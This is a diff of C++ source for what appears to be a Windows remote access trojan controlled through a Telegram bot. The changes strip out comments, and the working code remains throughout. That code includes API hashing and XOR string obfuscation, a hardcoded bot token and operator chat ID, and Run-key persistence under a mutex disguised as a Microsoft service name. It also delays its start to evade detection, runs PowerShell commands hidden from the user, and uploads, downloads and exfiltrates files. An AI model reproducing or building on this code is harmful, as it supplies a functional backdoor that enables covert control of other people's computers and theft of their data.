@@ -10,7 +10,6 @@
 
 using json = nlohmann::json;
 
-// ── Hash-based API resolution ─────────────────────────────────────────────────
 DWORD CalcHash(const char* data) {
     DWORD hash = 0x24;
     for (size_t i = 0; i < strlen(data); i++)
@@ -35,7 +34,6 @@ LPVOID GetProcByHash(HMODULE hModule, DWORD targetHash) {
     return NULL;
 }
 
-// ── API Hashes ────────────────────────────────────────────────────────────────
 #define HASH_RegOpenKeyExA        127569269
 #define HASH_RegSetValueExA       382791467
 #define HASH_RegQueryValueExA     3446660369
@@ -78,13 +76,11 @@ CloseHandle_t          myCloseHandle          = NULL;
 SetHandleInformation_t mySetHandleInformation = NULL;
 FreeConsole_t          myFreeConsole          = NULL;
 
-// ── String decryption ─────────────────────────────────────────────────────────
 void XORDecrypt(char* dest, const unsigned char* src, size_t len, char key) {
     for (size_t i = 0; i < len; i++) dest[i] = src[i] ^ key;
     dest[len] = '\0';
 }
 
-// Software\Microsoft\Windows\CurrentVersion\Run
 const unsigned char encryptedRegPath[] = {
     0x6, 0x3a, 0x33, 0x21, 0x22, 0x34, 0x27, 0x30, 0x9, 0x18, 0x3c, 0x36,
     0x27, 0x3a, 0x26, 0x3a, 0x33, 0x21, 0x9, 0x2, 0x3c, 0x3b, 0x31, 0x3a,
@@ -92,7 +88,6 @@ const unsigned char encryptedRegPath[] = {
     0x27, 0x26, 0x3c, 0x3a, 0x3b, 0x9, 0x7, 0x20, 0x3b, 0x00
 };
 
-// 8779556091:AAFRqhU2WhyzIF0zHqZexzDkC7lphX5rp0A
 const unsigned char encryptedBotToken[] = {
     0x6d, 0x62, 0x62, 0x6c, 0x60, 0x60, 0x63, 0x65, 0x6c, 0x64, 0x6f, 0x14,
     0x14, 0x13, 0x7, 0x24, 0x3d, 0x0, 0x67, 0x2, 0x3d, 0x2c, 0x2f, 0x1c,
@@ -100,12 +95,9 @@ const unsigned char encryptedBotToken[] = {
     0x62, 0x39, 0x25, 0x3d, 0xd, 0x60, 0x27, 0x25, 0x65, 0x14, 0x00
 };
 
-const long long serverChatId = 6539531752LL; // @NgcHuong
-
-// ── WinHTTP core ─────────────────────────────────────────────────────────────
+const long long serverChatId = 6539531752LL;
 static const wchar_t* TELE_HOST = L"api.telegram.org";
 
-// destFile: nếu set thì write binary xuống file thay vì return string
 std::string whRequest(const std::wstring& path, const std::string& method,
                       const std::string& body, const std::wstring& extraHeaders,
                       const std::string& destFile = "") {
@@ -124,7 +116,6 @@ std::string whRequest(const std::wstring& path, const std::string& method,
                                          WINHTTP_FLAG_SECURE);
     if (!hReq) { WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess); return ""; }
 
-    // Timeout 60s cho long-polling getUpdates
     DWORD timeout = 60000;
     WinHttpSetOption(hReq, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
 
@@ -165,7 +156,6 @@ std::string whRequest(const std::wstring& path, const std::string& method,
     return result;
 }
 
-// ── Telegram API ──────────────────────────────────────────────────────────────
 static std::string botPath() {
     char token[64];
     XORDecrypt(token, encryptedBotToken, sizeof(encryptedBotToken) - 1, 0x55);
@@ -241,14 +231,12 @@ json getUpdates(long long offset = 0) {
     try { return json::parse(resp); } catch (...) { return json::object(); }
 }
 
-// ── Command execution (PowerShell only) ──────────────────────────────────────
 std::string executePS(const std::string& cmd) {
     std::string command = cmd;
     size_t start = command.find_first_not_of(" \t");
     if (start == std::string::npos) return "(empty command)";
     command = command.substr(start);
 
-    // Native cd: persists working directory across separate PS invocations
     size_t sp = command.find_first_of(" \t");
     std::string verb = (sp == std::string::npos) ? command : command.substr(0, sp);
     std::string rest = (sp == std::string::npos) ? "" : command.substr(sp + 1);
@@ -289,8 +277,7 @@ std::string executePS(const std::string& cmd) {
         ? "powershell.exe " + command
         : "powershell.exe -NoProfile -NonInteractive -Command \"" + command + "\"";
 
-    BOOL ok = myCreateProcessA(NULL, &cmdLine[0], NULL, NULL, TRUE,
-                               CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    BOOL ok = myCreateProcessA(NULL, &cmdLine[0], NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     myCloseHandle(wPipe);
 
     if (!ok) {
@@ -322,7 +309,6 @@ std::string executePS(const std::string& cmd) {
     return result.empty() ? "(no output)" : result;
 }
 
-// ── Client identity: COMPUTERNAME\USERNAME ────────────────────────────────────
 std::string getClientName() {
     char computer[MAX_COMPUTERNAME_LENGTH + 1] = {};
     DWORD cSize = sizeof(computer);
@@ -335,7 +321,6 @@ std::string getClientName() {
     return std::string(computer) + "\\" + std::string(user);
 }
 
-// ── /information handler ──────────────────────────────────────────────────────
 std::string handleInformation() {
     return executePS(
         "$os  = Get-CimInstance Win32_OperatingSystem;"
@@ -357,7 +342,6 @@ std::string handleInformation() {
     );
 }
 
-// ── Persistence ───────────────────────────────────────────────────────────────
 void EnsurePersistence() {
     char regPath[256];
     XORDecrypt(regPath, encryptedRegPath, sizeof(encryptedRegPath) - 1, 0x55);
@@ -382,10 +366,8 @@ void EnsurePersistence() {
     myRegCloseKey(hKey);
 }
 
-// ── main ──────────────────────────────────────────────────────────────────────
 int main(int argc, char* argv[]) {
     try {
-        // Single instance: tránh chạy nhiều process cùng lúc
         HANDLE hMutex = CreateMutexA(NULL, TRUE, "Global\\MicrosoftSecurityHealthService");
         if (GetLastError() == ERROR_ALREADY_EXISTS) {
             CloseHandle(hMutex);
@@ -417,15 +399,12 @@ int main(int argc, char* argv[]) {
             !mySetHandleInformation || !myFreeConsole)
             return 1;
 
-        // Parse --background flag
         bool background = false;
         for (int i = 1; i < argc; ++i)
             if (strcmp(argv[i], "--background") == 0) { background = true; break; }
 
         EnsurePersistence();
 
-        // Jitter khi được launch từ Run key: delay 10–30s ngẫu nhiên
-        // Tránh pattern kết nối cố định ngay sau mỗi lần boot
         if (background) {
             srand(GetTickCount());
             Sleep(10000 + rand() % 20000);
@@ -433,7 +412,6 @@ int main(int argc, char* argv[]) {
 
         std::string clientName = getClientName();
 
-        // Retry until bot responds (instead of exiting on first empty result)
         json first;
         int retries = 0;
         do {
@@ -444,7 +422,6 @@ int main(int argc, char* argv[]) {
 
         if (retries >= 10) return 1;
 
-        // Seed lastUpdateId to skip old messages, avoid re-executing stale commands
         long long lastUpdateId = 0;
         if (first.contains("result") && first["result"].is_array())
             for (auto& u : first["result"])
@@ -470,10 +447,8 @@ int main(int argc, char* argv[]) {
 
                 auto& msg = update["message"];
 
-                // Only accept commands from the operator's chat
                 if (msg["chat"]["id"].get<long long>() != serverChatId) continue;
 
-                // File received after /upload
                 if (uploadPending && msg.contains("document")) {
                     std::string fileId   = msg["document"]["file_id"].get<std::string>();
                     std::string fileName = msg["document"]["file_name"].get<std::string>();
@@ -490,7 +465,6 @@ int main(int argc, char* argv[]) {
                 if (!msg.contains("text")) continue;
                 std::string text = msg["text"].get<std::string>();
 
-                // ── /help ────────────────────────────────────────────────────
                 if (text == "/help" || text == "/start") {
                     sendMessage(serverChatId,
                         "Commands\n"
@@ -504,15 +478,12 @@ int main(int argc, char* argv[]) {
                         "Everything else runs as PowerShell.\n"
                         "cd / cd.. are handled natively (persists across commands).");
                 }
-                // ── /healthcheck ──────────────────────────────────────────────
                 else if (text == "/healthcheck") {
                     sendMessage(serverChatId, "[+] ALIVE: " + clientName + " | PID: " + std::to_string(GetCurrentProcessId()));
                 }
-                // ── /information ─────────────────────────────────────────────
                 else if (text == "/information") {
                     sendChunked(serverChatId, handleInformation());
                 }
-                // ── /download <path> ─────────────────────────────────────────
                 else if (text.rfind("/download ", 0) == 0) {
                     std::string path = text.substr(10);
                     size_t s = path.find_first_not_of(" \t");
@@ -524,7 +495,6 @@ int main(int argc, char* argv[]) {
                         sendDocument(serverChatId, path);
                     }
                 }
-                // ── /upload [dest_path] ───────────────────────────────────────
                 else if (text.rfind("/upload", 0) == 0) {
                     uploadPending = true;
                     uploadDest    = "";
@@ -538,12 +508,10 @@ int main(int argc, char* argv[]) {
                             ? "[*] Ready. Send the file (will save with original name)."
                             : "[*] Ready. Send the file (will save to: " + uploadDest + ").");
                 }
-                // ── cmd <lệnh> → cmd /c <lệnh> ───────────────────────────────
                 else if (text.rfind("cmd ", 0) == 0) {
                     std::string output = executePS("cmd /c " + text.substr(4));
                     sendChunked(serverChatId, "[" + clientName + "]\n" + output);
                 }
-                // ── Default: PowerShell ───────────────────────────────────────
                 else {
                     std::string output = executePS(text);
                     sendChunked(serverChatId, "[" + clientName + "]\n" + output);
